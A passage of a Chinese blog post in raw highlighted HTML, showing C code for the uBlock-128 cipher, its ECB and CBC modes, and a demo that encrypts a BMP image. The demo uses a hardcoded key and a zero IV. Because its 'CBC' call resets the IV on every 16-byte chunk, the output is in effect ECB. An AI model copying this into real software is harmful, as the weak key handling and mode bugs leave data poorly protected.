_mm_shuffle_epi8(S_Inv, state2);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tk = _mm_loadu_si128((__m128i*)Subkey[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\tk = _mm_loadu_si128((__m128i*)(Subkey[<span class=\"number\">0</span>] + <span class=\"number\">16</span>));</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\"></span><br><span class=\"line\">\tt1 = _mm_shuffle_epi8(state1, c5);</span><br><span class=\"line\">\tt2 = _mm_shuffle_epi8(state2, c6);</span><br><span class=\"line\">\tt3 = _mm_shuffle_epi8(state1, c7);</span><br><span class=\"line\">\tt4 = _mm_shuffle_epi8(state2, c8);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstate1 = _mm_xor_si128(t1, t2);</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstate1 = _mm_slli_epi16(state1, <span class=\"number\">4</span>);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(state1, state2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t_mm_storeu_si128((__m128i*)plain, state1);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Enc_Block</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input, <span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output, <span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> g;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">uBlock_128_Encrypt</span>(input+g*<span class=\"number\">16</span>, output+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Dec_Block</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input,<span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output,<span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> g;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">uBlock_128_Decrypt</span>(input+g*<span class=\"number\">16</span>, output+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Enc_Block_Round</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input, <span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output, <span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen, <span class=\"type\">int</span> cryptround)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> g;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">uBlock_128_Encrypt</span>(input+g*<span class=\"number\">16</span>, output+g*<span class=\"number\">16</span>, cryptround);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Key_Schedule</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *seedkey, <span class=\"type\">int</span> keylen, <span class=\"type\">int</span> direction, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *subkey)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">   <span class=\"type\">int</span> i, j;</span><br><span class=\"line\">   </span><br><span class=\"line\">   <span class=\"built_in\">uBlock_128_KeySchedule</span>(seedkey);</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">if</span>(direction == <span class=\"number\">0</span>)</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">\t   <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">17</span>; i++)</span><br><span class=\"line\">\t   &#123;</span><br><span class=\"line\">\t\t   <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">16</span>; j++)</span><br><span class=\"line\">\t\t   &#123;</span><br><span class=\"line\">\t\t\t   subkey[i * <span class=\"number\">16</span> + j] = (Subkey[i][<span class=\"number\">2</span> * j] &lt;&lt; <span class=\"number\">4</span>) ^ Subkey[i][<span class=\"number\">2</span> * j + <span class=\"number\">1</span>];</span><br><span class=\"line\">\t\t   &#125;</span><br><span class=\"line\">\t   &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">if</span>(direction == <span class=\"number\">1</span>)</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">\t   <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">17</span>; i++)</span><br><span class=\"line\">\t   &#123;</span><br><span class=\"line\">\t\t   <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">16</span>; j++)</span><br><span class=\"line\">\t\t   &#123;</span><br><span class=\"line\">\t\t\t   subkey[i * <span class=\"number\">16</span> + j] = (Subkey[<span class=\"number\">16</span> - i][<span class=\"number\">2</span> * j] &lt;&lt; <span class=\"number\">4</span>) ^ Subkey[<span class=\"number\">16</span> - i][<span class=\"number\">2</span> * j + <span class=\"number\">1</span>];</span><br><span class=\"line\">\t\t   &#125;</span><br><span class=\"line\">\t   &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Enc_Block_CBC</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input, <span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output, <span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> g, j;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">char</span> iv[<span class=\"number\">16</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">16</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tiv[j] ^= input[g * <span class=\"number\">16</span> + j];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">uBlock_128_Encrypt</span>(iv, output+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">memcpy</span>(iv, output+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Dec_Block_CBC</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input,<span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output,<span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> g, j;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">char</span> iv[<span class=\"number\">16</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">uBlock_128_Decrypt</span>(input+g*<span class=\"number\">16</span>, output+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">16</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\toutput[g * <span class=\"number\">16</span> + j] ^= iv[j];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">memcpy</span>(iv, input+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Enc_Block_ECB</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input, <span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output, <span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> g;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">uBlock_128_Encrypt</span>(input + g * <span class=\"number\">16</span>, output + g * <span class=\"number\">16</span>, <span class=\"number\">16</span>); </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    *out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Dec_Block_ECB</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input, <span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output, <span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> g;    </span><br><span class=\"line\">    <span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">uBlock_128_Decrypt</span>(input + g * <span class=\"number\">16</span>, output + g * <span class=\"number\">16</span>, <span class=\"number\">16</span>); </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    *out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> key[<span class=\"number\">16</span>] = &#123;<span class=\"number\">0x01</span>, <span class=\"number\">0x23</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x67</span>, <span class=\"number\">0x89</span>, <span class=\"number\">0xAB</span>, <span class=\"number\">0xCD</span>, <span class=\"number\">0xEF</span>, <span class=\"number\">0xFE</span>, <span class=\"number\">0xDC</span>, <span class=\"number\">0xBA</span>, <span class=\"number\">0x98</span>, <span class=\"number\">0x76</span>, <span class=\"number\">0x54</span>, <span class=\"number\">0x32</span>, <span class=\"number\">0x10</span>&#125;;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> subkey[<span class=\"number\">272</span>];</span><br><span class=\"line\">    FILE *bmpFile, *encFile, *decFile;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> header[<span class=\"number\">54</span>]; <span class=\"comment\">// BMP 文件头大小为 54 字节</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 打开朱鹮.bmp文件</span></span><br><span class=\"line\">    bmpFile = <span class=\"built_in\">fopen</span>(<span class=\"string\">&quot;朱鹮.bmp&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;open successfully！\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (bmpFile == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;open failed！\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;无法打开文件。\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 读取BMP文件头</span></span><br><span class=\"line\">    <span class=\"built_in\">fread</span>(header, <span class=\"built_in\">sizeof</span>(<span class=\"type\">unsigned</span> <span class=\"type\">char</span>), <span class=\"number\">54</span>, bmpFile);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 创建加密文件和解密文件</span></span><br><span class=\"line\">    encFile = <span class=\"built_in\">fopen</span>(<span class=\"string\">&quot;朱鹮_CBC.bmp&quot;</span>, <span class=\"string\">&quot;wb&quot;</span>);</span><br><span class=\"line\">    decFile = <span class=\"built_in\">fopen</span>(<span class=\"string\">&quot;朱鹮_CBC_dec.bmp&quot;</span>, <span class=\"string\">&quot;wb&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// CBC加密</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> buffer[<span class=\"number\">16</span>];</span><br><span class=\"line\">    <span class=\"type\">int</span> bytesRead;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((bytesRead = <span class=\"built_in\">fread</span>(buffer, <span class=\"built_in\">sizeof</span>(<span class=\"type\">unsigned</span> <span class=\"type\">char</span>), <span class=\"number\">16</span>, bmpFile)) &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 执行CBC加密操作</span></span><br><span class=\"line\">        <span class=\"built_in\">Crypt_Enc_Block_CBC</span>(buffer, bytesRead, buffer, &amp;bytesRead, key, <span class=\"number\">16</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 将加密后的数据写入加密文件</span></span><br><span class=\"line\">        <span class=\"built_in\">fwrite</span>(buffer, <span class=\"built_in\">sizeof</span>(<span class=\"type\">unsigned</span> <span class=\"type\">char</span>), bytesRead, encFile);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 关闭加密文件</span></span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(encFile);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 重新打开加密文件进行解密</span></span><br><span class=\"line\">    encFile = <span class=\"built_in\">fopen</span>(<span class=\"string\">&quot;朱鹮_CBC.bmp&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (encFile == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;无法打开加密文件。\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 读取加密文件头</span></span><br><span class=\"line\">    <span class=\"built_in\">fread</span>(header, <span class=\"built_in\">sizeof</span>(<span class=\"type\">unsigned</span> <span class=\"type\">char</span>), <span class=\"number\">54</span>, encFile);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// CBC解密</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((bytesRead = <span class=\"built_in\">fread</span>(buffer, <span class=\"built_in\">sizeof</span>(<span class=\"type\">unsigned</span> <span class=\"type\">char</span>), <span class=\"number\">16</span>, encFile)) &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 执行CBC解密操作</span></span><br><span class=\"line\">        <span class=\"built_in\">Crypt_Dec_Block_CBC</span>(buffer, bytesRead, buffer, &amp;bytesRead, key, <span class=\"number\">16</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 将解密后的数据写入解密文件</span></span><br><span class=\"line\">        <span class=\"built_in\">fwrite</span>(buffer, <span class=\"built_in\">sizeof</span>(<span class=\"type\">unsigned</span> <span class=\"type\">char</span>), bytesRead, decFile);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 关闭所有文件</span></span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(bmpFile);</span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(encFile);</span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(decFile);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"ublock_bmp加密代码ecb加密-cpp\"><a class=\"anchor\" href=\"#ublock_bmp加密代码ecb加密-cpp\">#</a> uBlock_bmp (加密代码)——ECB 加密 .cpp</h2>\n<p><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span 